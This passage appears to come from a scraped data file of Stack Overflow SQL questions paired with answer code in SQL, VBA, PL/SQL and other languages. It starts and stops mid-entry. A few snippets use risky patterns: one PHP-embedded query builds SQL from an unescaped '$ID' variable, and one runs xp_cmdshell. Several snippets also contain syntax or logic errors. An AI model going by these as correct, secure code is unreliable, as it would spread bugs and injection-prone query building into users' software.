                With rst_Output

                    ' .AddNew tells the recordset we are adding a new record
                    .AddNew

                    ' Here we use a '!' (pronounced 'bang') to let VBA know
                    ' we are accessing members of a collection, and not a
                    ' method of doing something with rst_Output.
                    !column_date = s_CurrentDate
                    !qty1 = s_CurrentQty1
                    !qty2 = s_CurrentQty2
                    !qty3 = s_CurrentQty3
                    !qty4 = s_CurrentQty4

                    ' .Update tells the recordset we are done adding, and to save it
                    .Update
                End With

            ' If the CurrentDate value is a real date
            ' do the following
            Else
                With rst_Output
                    .AddNew

                    !Name = s_CurrentField1
                    !column_date = s_CurrentDate
                    !qty1 = s_CurrentQty1
                    !qty2 = s_CurrentQty2
                    !qty3 = s_CurrentQty3
                    !qty4 = s_CurrentQty4
                    .Update
                End With
            End If
            ' set index to optimistically reflect second record of rollup
            ' Values above '1' tell the logic that we are still using the
            ' same field1 ('xyz') value, but are no longer on the first
            ' occurance of the 'xyz' value.
            i = i + 1

            ' move to the next record of the input recordset
            .MoveNext

            'test if last move is the end of file
            If .EOF Then
                'exit sub if the end of file has been reached.
                Exit Sub
            End If

            ' get next field1 value to test in the do while exit condition
            If IsNull(.Fields(""field1"").Value) Then
                s_CurrentField1 = "" ""
            Else
                s_CurrentField1 = .Fields(""field1"").Value
            End If

        '#############################################
        ' If there is another record with the same field1 value (i.e. 'xyz'
        ' then do the following logic.
        ' This will replace the 'xyz' with an empty value so it does not
        ' show up in the tbl_Output table
        ElseIf i > 1 Then

            ' Move the data from the query which is stored in
            ' the rst_Input from the fields to variables
            s_CurrentField1 = "" ""
            s_CurrentDate = .Fields(""column_date"").Value
            s_CurrentQty1 = .Fields(""total1"").Value
            s_CurrentQty2 = .Fields(""total2"").Value
            s_CurrentQty3 = .Fields(""total3"").Value
            s_CurrentQty4 = .Fields(""total4"").Value

            With rst_Output
                .AddNew
                !Name = s_CurrentField1
                !column_date = s_CurrentDate
                !qty1 = s_CurrentQty1
                !qty2 = s_CurrentQty2
                !qty3 = s_CurrentQty3
                !qty4 = s_CurrentQty4
                .Update
            End With

            ' Set index to optimistically reflect second record of rollup
            i = i + 1

            ' Move to the next record of the input recordset
            .MoveNext

            ' Get next field1 value to test in the do while exit condition
            ' The IsNull makes sure that in the event that no information
            ' exists in the field1 column of the table, it is replaced with
            ' a "" "" character to avoid an invalid use of NULL in the variable
            If IsNull(.Fields(""field1"").Value) Then
                s_CurrentField1 = "" ""
            Else
                s_CurrentField1 = .Fields(""field1"").Value
            End If

        End If

    Loop  'do while

Loop 'do until

End With

' Now that everything has finished, it's proper coding technique
' to release all of the resources consumed by our data containing
' variables.
db.Close
rst_Output.Close
rst_Input.Close
Set db = Nothing
Set rst_Output = Nothing
Set rst_Input = Nothing

End Sub
"
11755,53594,SQL where x or y but not both,"create table tab
(
   Res   varchar(10), 
   Meat varchar(10)
)

insert into tab ( Res, Meat ) values ( 'res1', 'chicken' )
insert into tab ( Res, Meat ) values ( 'res1', 'chicken' )
insert into tab ( Res, Meat ) values ( 'res1', 'beef' )    
insert into tab ( Res, Meat ) values ( 'res2', 'chicken' )
insert into tab ( Res, Meat ) values ( 'res2', 'chicken' )    
insert into tab ( Res, Meat ) values ( 'res3', 'beef' )

select Res
from (
select distinct Res,Meat
from tab ) T
group by Res
having count(1) = 1
"
3063,12205,MS Access SQL updating in sequence,"SELECT * FROM snp
WHERE ID IN (SELECT MAX(ID)
             FROM tr
             GROUP BY CUST#)
"
20480,37143,MySQL Using alias in subquery,"SELECT 
  gs.PAGE, 
  gs.ID, 
  gs.CATALOGID
FROM pages gs 
WHERE gs.ID    = 404 
   OR gs.PAGE = ( SELECT PAGE + 1
                  FROM pages x 
                  where x.id = 404 
                  and gs.CATALOGID = x.CATALOGID); 
"
26777,32333,INSERT OR UPDATE TABLE FROM VIEW SQL SERVER 2008 r2,"MERGE INTO Sales.SalesReason AS Target
USING (VALUES ('Recommendation','Other'), ('Review', 'Marketing'), ('Internet', 'Promotion'))
       AS Source (NewName, NewReasonType)
ON Target.Name = Source.NewName
WHEN MATCHED THEN
    UPDATE SET ReasonType = Source.NewReasonType
WHEN NOT MATCHED BY TARGET THEN
    INSERT (Name, ReasonType) VALUES (NewName, NewReasonType)
"
29363,71982,Using OpenQuery With INSERT INTO Statement,"TRUNCATE TABLE mytable

INSERT INTO mytable (firstcolumn, secondcolumn)
SELECT firstcolumn, secondcolumn 
FROM OPENQUERY (mylinkedserver, 'SELECT firstcolumn, secondcolumn FROM linkedtable')
"
521,4947,No idea how to write complex SQL query,"SELECT f1.*
FROM Permissions p -- this is the many-to-many table
JOIN FileRevision f1
  ON (f1.file_id = p.file_id)
LEFT OUTER JOIN FileRevision f2 
  ON (f2.file_id = p.file_id AND f1.created_on < f2.created_on)
WHERE p.user_id = ? AND f2.file_id IS NULL;
"
19203,65470,sql query many-to-many,"select a.author_name, count(ab.book_id) total_books
from author_book ab
join authors a on a.author_id = ab.author_id
group by ab.author_name
having count(ab.book_id) > 2
"
17534,61670,Compare each row of a table to another table in SQL Server 2008,"-- t-sql
SELECT a.name
FROM table1 a
INNER JOIN (
  SELECT t1.name
  FROM table1 t1
  JOIN table2 t2 ON t1.name = t2.name
) b ON a.name = b.name
  OR SUBSTRING(a.name, 1, CHARINDEX('-', a.name)) <> SUBSTRING(b.name, 1, CHARINDEX('-',     b.name))
"
6494,37000,Sql Query for finding a certain frequency distribution,"select items_bought, count(*) as customers
from (
    select customerid, count(*) as items_bought
    from your_table
    group by customerid
) dt
group by items_bought
"
34971,30732,Writing a routine to create sequential records,"Sub FillBlanks()
    Dim rsEvents As Recordset
    Dim EventDate As Date
    Dim Fld1 As String
    Dim Fld2 As String
    Dim Fld3 As String
    Dim SQL As String

    Set rsEvents = CurrentDb.OpenRecordset(""SELECT * FROM tblevents ORDER BY EventDate"")
    'Save the current date & info
    EventDate = rsEvents(""EventDate"")
    Fld1 = rsEvents(""Field1"")
    Fld2 = rsEvents(""Field2"")
    Fld3 = rsEvents(""Field3"")
    rsEvents.MoveNext
    On Error Resume Next
    Do
        ' Loop through each blank date
        Do While EventDate < rsEvents(""EventDate"") - 1 'for all dates up to, but not including the next date
            EventDate = EventDate + 1 'advance date by 1 day
            rsEvents.AddNew
            rsEvents(""EventDate"") = EventDate
            rsEvents(""Field1"") = Fld1
            rsEvents(""Field2"") = Fld2
            rsEvents(""Field3"") = Fld3
            rsEvents.Update
        Loop
        ' get new current date & info
        EventDate = rsEvents(""EventDate"")
        Fld1 = rsEvents(""Field1"")
        Fld2 = rsEvents(""Field2"")
        Fld3 = rsEvents(""Field3"")
        rsEvents.MoveNext
        ' new records are placed on the end of the recordset,
        ' so if we hit on older date, we know it's a recent insert and quit
    Loop Until rsEvents.EOF Or EventDate > rsEvents(""EventDate"")
End Sub
"
17235,68981,Using the results of an aggregate function in a calculation,"SELECT MAX(Col1) OVER(PARTITION BY ID) MaxValue, 
       Col2 + MAX(Col1) OVER(PARTITION BY ID)
FROM TableA
"
7609,13487,parse openxml and get a name value collection for given node,"SELECT replace(name,'__',' ') as name, value 
            FROM OPENXML (@idoc, '/user/additionalfields/*',1) 
            WITH (          
                Name  nvarchar(4000) '@mp:localname',
                value  nvarchar(4000) './text()'
                  ) 
"
5618,36903,How to write or append to text file using sql?,"exec master..xp_cmdshell 'echo pranay test application > d:\file.txt'
"
7835,16374,Minimum datetime and maximum datetime,"orderdate >= @startdate and orderdate < Dateadd(d, 1, @enddate)
"
37272,28477,How to Improve Oracle Query Performance when use ListAggregate function,"with tab as (
-- your query here
-- providing the group column and fee column
select group_id, fee ....

)
select group_id,
listagg(fee,' + ') within group (order by fee) ||
' = ' || sum(fee) as fees
from tab
group by group_id
"
37940,7686,How to make sure that if week does not contain 1st Jan it would be Week53 in SQL?,"declare @dt date
set @dt='2015/12/31';

SELECT @dt, CASE
            WHEN DATEPART(WEEK,@dt) < 53 
            THEN DATEPART(WEEK,@dt)

            WHEN DATEPART(WEEKDAY,@dt) = 7 
            THEN DATEPART(WEEK,@dt)
            WHEN DATEPART(WEEKDAY,@dt) = 6 AND DATEDIFF(D,@dt,DATEADD(day, (8-datepart(weekday, @dt))%7, @dt))=1
            THEN DATEPART(WEEK,@dt)
            WHEN DATEPART(WEEKDAY,@dt) = 5 AND DATEDIFF(D,@dt,DATEADD(day, (8-datepart(weekday, @dt))%7, @dt))<=2
            THEN DATEPART(WEEK,@dt)
            WHEN DATEPART(WEEKDAY,@dt) = 4 AND DATEDIFF(D,@dt,DATEADD(day, (8-datepart(weekday, @dt))%7, @dt))<=3
            THEN DATEPART(WEEK,@dt)
            WHEN DATEPART(WEEKDAY,@dt) = 3 AND DATEDIFF(D,@dt,DATEADD(day, (8-datepart(weekday, @dt))%7, @dt))<=4
            THEN DATEPART(WEEK,@dt)
            WHEN DATEPART(WEEKDAY,@dt) = 2 AND DATEDIFF(D,@dt,DATEADD(day, (8-datepart(weekday, @dt))%7, @dt))<=5
            THEN DATEPART(WEEK,@dt)
            WHEN DATEPART(WEEKDAY,@dt) = 1 AND DATEDIFF(D,@dt,DATEADD(day, (8-datepart(weekday, @dt))%7, @dt))<=6
            THEN DATEPART(WEEK,@dt)         
            ELSE
            1
        END
"
32049,74545,Select dummy data for a certain period of years based on some conditions from a main query,"SELECT e.idEmployee, COALESCE(ed.idExceptionDayType, 1) as idExceptionDayType
      y.year, COALESCE(SUM(ed.days), 0) as total
FROM (SELECT DISTINCT idEmployee FROM ExceptionDays) e CROSS JOIN
     (SELECT DISTINCT YEAR(startDate) as year FROM ExceptionDays) y LEFT JOIN
     ExceptionDays ed
     ON ed.idEmployee = e.idEmployee and
        y.year BETWEEN YEAR(ed.startDate) AND year(GETDATE())
GROUP BY e.idEmployee, ed.idExceptionDayType, y.year
"
20296,39967,Pattern to substitute for MERGE INTO Oracle syntax when not allowed,"create table src_table(
   id number primary key,
   name varchar2(20) not null
);

create table tgt_table(
   id number primary key,
   name varchar2(20) not null
);

insert into src_table values (1, 'abc');
insert into src_table values (2, 'def');
insert into src_table values (3, 'ghi');

insert into tgt_table values (1, 'abc');
insert into tgt_table values (2,'xyz');

SQL> select * from Src_Table;

        ID NAME
---------- --------------------
         1 abc
         2 def
         3 ghi

SQL> select * from Tgt_Table;

        ID NAME
---------- --------------------
         2 xyz
         1 abc

Update tgt_Table tgt
   set Tgt.Name = 
      (select Src.Name
          from Src_Table Src
          where Src.id = Tgt.id
      );

2 rows updated. --Notice that ID 1 is updated even though value did not change

select * from Tgt_Table;

   ID NAME
----- --------------------
    2 def
    1 abc

insert into tgt_Table
select src.*
  from Src_Table src,
       tgt_Table tgt
  where src.id = tgt.id(+)
    and tgt.id is null;

1 row created.

SQL> select * from tgt_Table;

        ID NAME
---------- --------------------
         2 def
         1 abc
         3 ghi

commit;
"
5649,75625,update using increments in mysql return duplicate key error,"UPDATE x SET y = y + 1 order by y DESC
"
34146,66679,Update statement for one column from sourcedb.table.column to my current column. Error: Could not be bound,"USE PHARMA
UPDATE item 
SET item_uom = pos.uom
FROM item i
INNER JOIN POSDB.dbo.Items pos 
ON i.item_name = pos.item_desc
"
29186,37133,Oracle update identic rows in a table,"UPDATE your_table
   SET active = 'NOK'
 WHERE (name, location) IN (SELECT name, location 
                              FROM your_table 
                             GROUP BY name, location 
                            HAVING COUNT(*) > 1)
"
29039,6415,SQL query: SUM values up to the current record,"SELECT t1.id, t1.transactiondatetime, amount,
(
 SELECT SUM(amount) 
 FROM dbo.table1 as t1 
 WHERE t1.transactiondatetime <= t0.transactiondatetime
) AS balance
FROM dbo.table1 AS t0
"
7546,11181,How to get last inserted row in sap hana sql trigger?," CREATE TRIGGER TEST_TRIGGER_VAR_UPDATE                   
 AFTER UPDATE ON TARGET                                   
 REFERENCING NEW ROW mynewrow, OLD ROW myoldrow          
 FOR EACH ROW                                             
 BEGIN                                                    
  INSERT INTO SAMPLE_new VALUES(:mynewrow.a, :mynewrow.b); 
  INSERT INTO SAMPLE_old VALUES(:myoldrow.a, :myoldrow.b);
  INSERT INTO SAMPLE VALUES(0, 'trigger');
 END;       
"
6337,64493,difference in inserting data using select from dual,"insert
into   table_x
( col1
)
select 'a'
from   dual
union
all
select 'b'
from   dual
;
"
26963,68833,How can I get a subset of rows from Oracle database?,"SELECT
  a, b, c, d
FROM
  yourTable
GROUP BY
  a, b, c, d

SELECT
  DISTINCT
  a, b, c, d
FROM
  yourTable
"
28415,27041,Find the time difference between two consecutive rows in the same table in sql,"select t1.EmpID, t1.TimeIn, t1.TimeOut, 
       datediff(minute, max(t2.TimeOut), t1.TimeIn) as minutes
from timesheet t1 left join timesheet t2 on t1.EmpID = t2.EmpID 
       and t2.TimeOut < t1.TimeIn
group by t1.EmpID, t1.TimeIn, t1.TimeOut
"
34477,41946,Plsql to spell number (currency) to Italian currency without hardcoded the translation number,"CREATE OR REPLACE FUNCTION Currency_conversion(currency IN NUMBER) 
RETURN VARCHAR2 IS 
    txt varchar2(4000);
    tlum  varchar2(4000);
    babelTxt varchar(32000);
    req   utl_http.req;
    resp  utl_http.resp;
    webtext VARCHAR2(4000);
    webextract VARCHAR2(4000);
BEGIN
    -- This is used to convert number to words in english
    SELECT CAST( to_char( to_timestamp( lpad(currency,9,'0'), 'FF9' ), 'FFSP' ) AS VARCHAR2(100) )
    into txt from dual;

    -- FFSP is used to spell Fraction second in words for example HH24SP
    -- can be used to spell hours from 0 to 23,i used FFSP to get max range
    txt:=translate(txt,'x-','x ');

    -- The below logic is taken from
    -- https://forums.oracle.com/forums/thread.jspa?threadID=1122273(and)start=15(and)    tstart=0
    --need to test once
    -- request that exceptions are raised for error status codes
    utl_http.set_response_error_check(enable => TRUE); 
    -- allow testing for exceptions like Utl_Http.Http_Server_Error
    utl_http.set_detailed_excp_support(enable => TRUE);

    txt:=utl_url.escape(txt);

    babelTxt := 'http://babelfish.yahoo.com/translate_txt?doit=done' || '&'   || 'lp=en_it' || '&' || 'intl=1' || '&' || 'ei=utf8' || '&' || 'trtext=' || txt;
    req:=utl_http.begin_request(url => babelTxt, method => 'GET');
    resp := utl_http.get_response(r => req);
    BEGIN
        LOOP
            --utl_http.read_text(r => resp, data => webtext, len => 32767);
                utl_http.read_line(r => resp , data => webtext);

            webextract := regexp_substr(webtext,'<div id=""result""><div style=""padding:0.6em;"">(.+)</div></div>');

            if webextract is not null 
            then
                select regexp_replace(webextract,'<div id=""result""><div style=""padding:0.6em;"">(.+)</div></div>','\1')        
                into tlum FROM dual;
            end if;

            exit when tlum is not null;

            END LOOP;
    EXCEPTION
     WHEN utl_http.end_of_body THEN
     NULL;
    END;



    utl_http.end_response(r => resp);

    return tlum;

    EXCEPTION
        WHEN OTHERS THEN
        dbms_output.put_line(SQLERRM);
        return '';
END;
/
exit;
"
25357,15839,"SQL Join Query - two FK, one field"," SELECT i.sPolicyNumber,
        i.dDatePaid,
        i.dRenewal,
        i.mLastPremium,
        c.sCreditorName,
        b.sCreditorName
   FROM Insurance i
        LEFT JOIN Creditor  c ON c.lCreditorID = i.lCreditorID
        LEFT JOIN Creditor  b ON b.lCreditorID = i.lBrokerID
  WHERE Insurance.lOwnersCorporationID = '1'
"
14058,8638,Combining rows without a unique identifier,"select a.*, b.reference as 'Modify', b.details as 'Expires'
from my_table a
join my_table b on a.pri_key = b.pri_key - 1
  -- and a.date_time = b.date_time
  -- and a.personid = b.personid
  -- and b.type = 'B'
where a.type = 'A'
"
19547,5348,"Insert a row, based on a fields value","DECLARE @d TABLE (Supplier VARCHAR(32), Quantity INT);

INSERT @d SELECT 'ABC',3
UNION ALL SELECT 'BCD',1  
UNION ALL SELECT 'CDE',2  
UNION ALL SELECT 'DEF',1;

WITH x AS 
(
  SELECT TOP (10) rn = ROW_NUMBER() --since OP stated max = 10
  OVER (ORDER BY [object_id]) 
  FROM sys.all_columns 
  ORDER BY [object_id]
)
SELECT d.Supplier, d.Quantity
FROM x
CROSS JOIN @d AS d
WHERE x.rn <= d.Quantity
ORDER BY d.Supplier;
"
16675,48598,How to Load CSV file into Apex 5 for particular columns?,"update your_table_name
set 
x=20
where x is null;
"
26964,19760,Percentage of total in PivotTable,"SELECT CONVERT (Date, [Stamp]) AS Date
  ,SUM(case when Pass='P' and TestRig = 'Rig 1' THEN 1 ELSE 0 END) AS R1Passes
  ,SUM(case when Pass='P' and TestRig = 'Rig 2' THEN 1 ELSE 0 END) AS R2Passes
  ,SUM(case when Pass IN ('P', 'F') and TestRig = 'Rig 1' THEN 1 ELSE 0 END) AS R1Tests
  ,SUM(case when Pass IN ('P', 'F') and TestRig = 'Rig 2' THEN 1 ELSE 0 END) AS R2Tests
FROM [dbase].[dbo].[tbl_Results]
where Stamp > '2013-12-01'
  and TestName = 'Finished'
GROUP BY CONVERT (Date, [Stamp])
"
9773,18136,Java.sql.Date to Oracle database Date and Timestamp," bean.setStartTime(new java.sql.Timestamp(...))
"
13363,68012,Is there a reliable way to convert unzoned datetime into UNIX time_t?,"use DateTime::Format::MSSQL;
# In reality you would get this from the DB.
my $input = ""2009-11-30 16:13:18.123"";
my $dt = DateTime::Format::MSSQL->parse_datetime($input);
$dt->set_time_zone(""Europe/London"");
print ""Unix time is "", $dt->epoch, ""\n"";
"
34745,55177,Date ranges in SQL,"select * 
from accounts 
where trial_expiration_date between DATE_SUB(curdate(), INTERVAL 1 MONTH) 
    and DATE_SUB(curdate(), INTERVAL 2 WEEK) 
"
39202,40049,SQL Query Counting Instances of a Word in a Record,"SELECT
 (CHAR_LENGTH(sentence)-CHAR_LENGTH(REPLACE(LOWER(sentence),'the','')))/CHAR_LENGTH('the')
 AS occurences
FROM yourtable;
"
25748,3737,Query to get column value comma separated,"SELECT WM_CONCAT(NAME) FROM CUSTOMER;
"
21379,54218,SQL Hurdle - SQL Server 2008,"WITH MyCte AS    
    (SELECT	MyWeek = 1     
    UNION ALL     
    SELECT	MyWeek + 1     
    FROM	MyCte     
    WHERE	MyWeek < 53)
SELECT  MyWeek, 
    	DATEPART(year, DATEADD(wk, -MyWeek, GETDATE())),
    	DATEPART(month, DATEADD(wk, -MyWeek, GETDATE())),
    	DATEPART(wk, DATEADD(wk, -MyWeek, GETDATE()))
FROM    MyCte
"
3380,11939,(SQL Server) return sub-string value after 1st occurrence of 'character',"MariaDB []> SELECT SUBSTRING_INDEX('10374-0-dd.txt', '-', -1);
+--------------------------------------------+
| SUBSTRING_INDEX('10374-0-dd.txt', '-', -1) |
+--------------------------------------------+
| dd.txt                                     |
+--------------------------------------------+
1 row in set (0.00 sec)

MariaDB []> SELECT SUBSTRING_INDEX('10374-0--1234-56789-hallo.txt', '-', -1) ;
+-----------------------------------------------------------+
| SUBSTRING_INDEX('10374-0--1234-56789-hallo.txt', '-', -1) |
+-----------------------------------------------------------+
| hallo.txt                                                 |
+-----------------------------------------------------------+
1 row in set (0.00 sec)

MariaDB []>
"
14382,37042,How do I remove spaces while importing flat file containing intermediate blank lines?,"public override void Input0_ProcessInputRow(Input0Buffer Row)
{
    Row.CleansedData = Row.Name.Replace(@""\r\n"", string.Empty).Trim();
}
"
13886,675,What is the syntax to return a user defined string in a left outer join?,"SELECT id,text,COALESCE(flange,'MY string') as flange from ...
"
509,7006,Join two tables and group by problems,"select p.`name`, p.`id`, r.`user_id`, sum(r.`value`) as knowledge
from
`responses` r
join `problems` p on r.`problem_id` = p.`id`
where
r.`user_id` = 4
group by p.`name`, p.`id`
"
16087,1294,Is it possible to merge two MySQL databases into one?,"RENAME TABLE current_db.tbl_name TO other_db.tbl_name;
"
19872,58423,Better way to write a SQL query with many ORs,"WHERE color IN ('Red', 'Blue', ... )
"
6049,58402,Combine rows adding specific columns,"Select employee_id, Sum(totalWorkHours) As actualWorkHours
From   YourTableName
Group By employee_id
Order By employee_id
"
5474,67403,Stop duplication of data in left join,"SELECT '$ID' ID, T.T_ID, T.name, T.pic, T.timestamp AS T_ts,
       (SELECT COUNT(*) FROM track_plays WHERE T_ID = T.T_ID) AS plays,
       (SELECT COUNT(*) FROM track_downloads WHERE T.T_ID) AS downloads,
       NULL S_ID, NULL status, NULL S_ts,
       NULL G_ID, NULL gig_name, NULL date_time, NULL lineup, NULL price, NULL currency, NULL G_pic, NULL ticket, NULL venue, NULL G_ts
FROM TRACKS T
WHERE T.ID = '$ID'
UNION ALL
SELECT '$ID' ID, NULL T_ID, NULL name, NULL pic, NULL T_ts, NULL plays, NULL downloads,
       S.S_ID, S.status, S.timestamp AS S_ts,
       NULL G_ID, NULL gig_name, NULL date_time, NULL lineup, NULL price, NULL currency, NULL G_pic, NULL ticket, NULL venue, NULL G_ts
FROM STATUS S
WHERE S.ID = '$ID'
UNION ALL
SELECT '$ID' ID, NULL T_ID, NULL name, NULL pic, NULL T_ts, NULL plays, NULL downloads,
       NULL S_ID, NULL status, NULL S_ts,
       G.G_ID, G.gig_name, G.date_time, G.lineup, G.price, G.currency, G.pic AS G_pic, G.ticket, G.venue, G.timestamp AS G_ts
FROM GIGS G
WHERE G.ID = '$ID'
ORDER BY S_ts, G_ts, T_ts DESC 
LIMIT 20
"
33171,40235,PostgreSQL - Need a way to return all results,"         SELECT cmsuser.userid as ""User ID"", 
                cmsuser.username as ""Username"", 
                cmsuserprofile.value as ""SFDC Contact ID""
           FROM cmsuser
LEFT OUTER JOIN cmsuserprofile 
             ON cmsuser.userid = cmsuserprofile.userid 
           WHERE fieldid = '5004';
"
18198,4146,Find and update the current live program in mysql with SQL query,"SELECT * FROM tv_programs
WHERE start_time <= NOW()
ORDER BY start_time DESC
LIMIT 1;
"
32543,15384,Selecting a range with two fields,"SELECT * FROM tbl
WHERE ( job + suffix*0.001 )
BETWEEN (starting_job + suffix*0.001) AND (ending_job + suffix*0.001)
"
19365,35795,SQL server calculate and insert with loops,"UPDATE myTable
SET MaxWs2m = MaxWs * 0.75, AvgWs2m = AvgWs * 0.75
"
15896,12713,MySql Add Literal Percent Sign (%) to my calculation,"CONCAT(ROUND(qy.TotalUnits/qy.TotalCalls *100),'%')
"
8507,39418,Get another value with max,"SELECT field_2 FROM mytable WHERE field_1 = (
    SELECT MAX(field_1) FROM mytable)
"
350,62725,Need ALL data from a table with JOIN to another table with multile AND on multiple ROW,"  SELECT `h.id` , `h.name`  FROM `hotel` AS `h` 
  INNER JOIN `hotel_amenity` AS `ha` ON `h`.`id` = `ha`.`hotel_id` 
  INNER JOIN `amenity` AS `a` ON `ha`.`amenity_id` = `a`.`id` 
  GROUP BY `h`.`id` 
  HAVING COUNT( case when a.id in (1,3) then 1 else null end ) = 2
"
21434,22982,Oracle downtime in minutes per month,"WITH 
M AS (  
    SELECT ADD_MONTHS (TRUNC (SYSDATE, 'MONTH'), -1 * LEVEL) AS MO
    , 0 AS DOWNTIME FROM DUAL
    CONNECT BY LEVEL <= 12),

D AS (  -- data simulating a downtime day
     SELECT 'Target Up' AS AVAILABILITY_STATUS,
            TO_DATE ('9/25/2015 15:12:47', 'MM/DD/YYYY HH24:MI:SS')
               AS SINCE,
            385392 AS MINUTES
       FROM DUAL
     UNION ALL
     SELECT 'Target Down' AS AVAILABILITY_STATUS,
            TO_DATE ('11/25/2015 15:12:00', 'MM/DD/YYYY HH24:MI:SS')
               AS SINCE,
            1440 AS MINUTES
       FROM DUAL
     UNION ALL
     SELECT 'Target Up' AS AVAILABILITY_STATUS,
            TO_DATE ('11/26/2015 15:12:00', 'MM/DD/YYYY HH24:MI:SS')
               AS SINCE,
            200122 AS MINUTES
       FROM DUAL)
SELECT M.mo, Nvl(s, 0) AS minutes
FROM M
     LEFT JOIN (  SELECT TRUNC (SINCE, 'MONTH') AS D, SUM (MINUTES) AS S
                    FROM D
                   WHERE AVAILABILITY_STATUS = 'Target Down'
                GROUP BY TRUNC (SINCE, 'MONTH')) GR
        ON GR.D = M.MO
ORDER BY 1;
"
10953,72056,Conditionally add a new column in conjunction with UNION ALL in PostgreSQL,"CREATE TABLE x AS 
SELECT 'y' src, * FROM y
UNION ALL
SELECT 'z' src, * FROM z;
"
36463,66039,Uniquely Joining Rows in SQL when Tables Have Unequal Row Counts,"--pseudo-tables with sample data
with t_map  as (select 1 serial_no, 33 cnty,  88 dist, '12345678' map_no from dual),
 t_corr as (select 1 serial_no, 'PUBLIC' property_cd, 100 corr_ft from dual union all
            select 1, 'PRIVATE', 200 from dual),
 t_wire as (select 1 serial_no, 12 oper_kv, 300 wire_ft from dual union all 
            select 1, 33, 200 from dual union all
            select 1, 66, 200 from dual)
--query itself
select m.serial_no, m.cnty, m.dist, m.map_no, r.*
  from  t_map m join 
        (select nvl(c.serial_no, w.serial_no)  serial_no, c.property_cd, c.corr_ft, w.oper_kv, w.wire_Ft from (
                        (select t_corr.*, row_number() over(partition by serial_no order by serial_no) rn from t_corr) c 
              full join (select t_wire.*, row_number() over(partition by serial_no order by serial_no) rn from t_wire) w 
                     on c.serial_no = w.serial_no and (c.rn = w.rn)
                       )
        ) r on r.serial_no = m.serial_no;
"
26000,9517,How to improve the speed of this SQL update query?,"UPDATE p
SET starter = 'TRUE'
FROM player p 
JOIN (
    SELECT school, weight, MAX(skill) AS MaxSkill
    FROM player
    GROUP BY school, weight
) maxResults 
    ON maxResults.school = p.school 
    AND maxResults.weight = p.weight 
    AND maxResults.MaxSkill = p.skill
"
33605,7430,Find all parent and child with a relationship table,"WITH MyCTE AS
(
   SELECT
       LocID, 1 as Level,
       NULL as LocIDH_Ancestry,
       Field1, Field2
   FROM
       Table1
   WHERE
       LocID NOT IN (SELECT LocID_B FROM Table2)

   UNION ALL

   SELECT
       t1.LocID,
       c.Level + 1 as Level,
       t2.LocID_A as LocIDH_Ancestry,
       t1.Field1, t1.Field2
   FROM
       Table1 t1
   INNER JOIN
       Table2 t2 ON t1.LocID = t2.LocID_A
   INNER JOIN
       MyCTE c ON t2.LocID_B = c.LocID
)
SELECT *
FROM MyCTE
"
16712,10864,Replacing String in SQL,"UPDATE Table
  SET ColumnName = LEFT(ColumName, 6) + '09'
Where ColumnName LIKE '[0-9][0-9][0-9][0-9][0-9] 01'
"
17101,60102,Single SQL query to find rows where a value is present for one key but not another given key,"   SELECT a.p_id
     FROM A_P a
LEFT JOIN A_P b ON b.p_id = a.p_id
               AND b.a_id = 2
    WHERE a.a_id = 1
      AND b.p_id IS NULL
"
1446,15942,how can I locate this my ms access file easier?,"Imports System.IO


dbSource = ""Data Source = "" & Path.Combine(Application.StartupPath, ""database\sample\cctvGmapVbDatabase.mdb"")
"
31719,47645,Query optimisation,"SELECT STRAIGHT_JOIN
        PA.REGISTRATION_NO,
        PA.APP_ID,
        PA.NO_OF_ATTEMPTS,
        CM.CATEGORY_NAME, 
        DM.SITE_DIMENSION,
        PR.BDA_NO,
        AN.NOTIFY_ID 
    FROM 
        PUBLIC_APPLICATION PA,
        CATEGORY_MASTER CM,
        NOTIFICATION_SITE_DETAIL NSD,
        DIMENSION_MASTER DM, 
        PUBLIC_REGISTRATION PR,
        ALLOTMENT_NOTIFICATION AN 
    WHERE 
            PA.NOTIFICATION_NO = ? 
        AND PA.CATEGORY_ID = CM.CATEGORY_ID
        AND PA.REGISTRATION_NO = PR.REGISTRATION_NO
        AND PA.NOTIFICATION_NO = AN.NOTIFICATION_NO
        AND PA.NOTIFY_SITE_ID = PR.NOTIFY_SITE_ID 
        AND PR.NOTIFY_SITE_ID = NSD.NOTIFY_SITE_ID
        AND NSD.DIMENSION_ID  = DM.DIMENSION_ID
        AND NSD.NOTIFY_ID = AN.NOTIFY_ID 
    LIMIT 
        ?, ?
"
15713,33638,Comma-separated list of dynamic column names,"Declare @CSV NVarchar(255) = 'Amount,Cost,Year'

;WITH Splitter AS (
  SELECT @CSV String
       , WordCounter = 0
       , NWordStart = 1
       , NWordEnd = CHARINDEX(',', @CSV)
       , Word = CAST('' AS NVarchar(255))
       , WordNumber = LEN(@CSV) - LEN(REPLACE(@CSV, ',', '')) + 1
  UNION ALL
  SELECT s.String
       , WordCounter = s.WordCounter + 1
       , NWordStart = s.NWordEnd + 1
       , NWordEnd = COALESCE(NULLIF(CHARINDEX(',', s.String, NWordEnd + 1), 0)
                           , LEN(s.String) + 1)
       , Word = Cast(SUBSTRING(String, s.NWordStart, s.NWordEnd - s.NWordStart) 
                  AS NVarchar(255))
       , WordNumber = s.WordNumber
  FROM   Splitter s
  WHERE  s.WordCounter + 1 <= s.WordNumber
)
SELECT Word
FROM   Splitter
WHERE  WordCounter > 0
"
10226,41100,Optimizing SQL Query for mySQL,"SELECT
  V.VID, V.Bezeichnung, V.Datum
FROM
  tbl_Veranstaltung     V
INNER JOIN
  Veranstaltung_User    VUser
    ON VUser.BewerbID = V.VID
INNER JOIN
  Veranstaltung_User    VUser2
    VUser.UserID = VUser2.UserID
WHERE
      V.Datum >= '20120101'
  AND V.Datum <  '20130101'
  AND V.VID <> 613
  AND VUser.UserID <> 0
  AND VUser2.BewerbID  = 613
ORDER BY
  Datum
"
17520,3350,SQL query: Select max value of subselect,"SELECT a.*
FROM article a LEFT JOIN OrderItems o ON a.anr = o.artnr
WHERE o.artnr IS NULL AND
    a.price = (SELECT MAX(a.price)
               FROM article a LEFT JOIN OrderItems o ON a.anr = o.artnr
               WHERE o.artnr IS NULL)
"
23063,55047,SQL Functions - factorial,"CREATE FUNCTION dbo.Factorial ( @iNumber int )
RETURNS INT
AS
BEGIN
DECLARE @i  int

    IF @iNumber <= 1
        SET @i = 1
    ELSE
        SET @i = @iNumber * dbo.Factorial( @iNumber - 1 )
RETURN (@i)
END
"
15426,31329,Most frequent attribute for a subject not returning correct number of distinct subjects,"SELECT DISTINCT
F1.EPISODIO,
x.TIPO_ASSEPSIA
FROM DWS_DM F1
OUTER APPLY
    (       SELECT TOP 1 r.TIPO_ASSEPSIA , (COUNT(*)) AS freq
            FROM  DWS_DM r
            WHERE r.EPISODIO = F1.EPISODIO
